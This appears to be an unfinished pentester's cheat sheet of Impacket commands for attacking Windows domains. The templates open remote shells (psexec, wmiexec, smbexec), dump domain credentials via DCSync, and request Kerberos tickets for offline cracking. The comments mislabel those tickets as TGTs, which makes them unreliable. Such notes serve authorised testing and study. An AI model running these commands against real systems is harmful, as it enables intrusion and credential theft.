Impacket is a suite of tools that is massively useful when compromising Windows hosts.

# Impacket-PSExec
```shell
impacket-psexec <domain>/<user>:<pass>@<IP> # Get a shell on the target machine via PsExec (if user has local administrator rights). Requires transferring a binary to the target machine.
```

# Impacket-WMIExec
```shell
impacket-wmiexec <domain>/<user>:<pass>@<IP> # Get a shell on the target machine via Windows Management Instrumentation. 
```
WMIExec is marginally more stealthy than PSExec but it has WMI as an obvious prerequisite. 

# Impacket-SMBExec
```shell
impacket-smbexec <domain>/<user>:<pass>@<IP> # Get a shell on the target machine via SMB named pipes without transferring a binary.
```
# Impacket-SecretsDump
```shell
impacket-secretsdump -outputfile <hashes outfile> -just-dc <domain>/<user>@<DC_IP> # Perform DCSync attack against a domain controller with Domain Admin credentials or other user creds with DCSync rights. 
```

# Impacket-SMBServer
TODO: Finish

# Impacket-GetUserSPNs
```shell
impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> # List SPN accounts
impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request # Request all TGTs. 
impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request-user <SPN> -outputfile out-tgt # Request one TGT and save
```
The `out-tgt` can be cracked with hashcat mode 13100. 

# Impacket-raiseChild
TODO: Write this

# Impacket-ticketer
TODO: Write this

# Impacket-lookupsid
TODO: Write this

Install with apt on Kali and use syntax above
